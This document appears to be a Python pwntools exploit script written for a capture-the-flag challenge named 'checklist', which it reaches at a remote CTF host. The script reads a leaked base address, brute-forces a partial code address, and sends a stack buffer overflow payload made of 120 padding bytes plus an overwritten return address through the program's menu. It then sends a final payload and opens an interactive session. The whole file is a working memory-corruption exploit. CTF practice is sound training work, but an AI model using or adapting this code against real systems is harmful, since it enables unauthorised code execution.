#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("checklist")

context.binary = exe
timeout = 0.005

def conn():
    global timeout
    if args.LOCAL:
        r = process([exe.path])
        # gdb.attach(r)
    else:
        timeout = 0.005
        r = remote("undutmaning-checklist.chals.io", 443, ssl=True, sni="undutmaning-checklist.chals.io")  
        log.info("Sleeping for stability")
        sleep(1)

    return r


def main():
    r = conn()
    
    r.recvuntil(b'address ')
    addr = int(r.recvline().strip(), 16)
    log.info(f"base: {hex(addr)}")

    i = 1
    hex_addr = hex(addr)[:-6]
    log.info(f"hex_addr: {hex_addr}")
    
    # r.clean()
    while True:
        # Format the brute
        i_str = str(hex(i).split('x')[1])
        match len(i_str):
            case 1:
                brute = f'00{i_str}'
            case 2:
                brute = f'0{i_str}'
            case _:
                brute = i_str
        brute = hex_addr + brute + '600'
        print(f"brute: {brute}")
        
        # Populate deferred
        r.sendline(b'7')
        
        r.clean(timeout=timeout)
        r.sendline(b'3')

        r.clean(timeout=timeout)
        r.sendline(b'3')
        
        r.clean(timeout=timeout)
        r.sendline(b'4')

        r.clean(timeout=timeout)
        r.sendline(b'a' * 120 + (int(brute, 16)).to_bytes(8, 'little'))
        # sleep(1) 
        num = r.recv(2)
        r.clean(timeout=timeout)
        
        # print(res)
        # print(num)
        if num == b' 2':
            brute = brute[8:-3]
            log.info(f"Success: {brute}")
            break
        i += 1

    # Correct address found, setting up for the final payload
    r.sendline(b'lesgo')
    r.clean()
    r.sendline(b'7')
    r.clean()
    r.sendline(b'3')
    r.clean()
    r.sendline(b'3')
    r.clean()
    r.sendline(b'4')
    r.clean()
    r.sendline(b'a' * 120 + (int(hex_addr + brute + '400', 16)).to_bytes(8, 'little'))
    r.interactive()


if __name__ == "__main__":
    main()
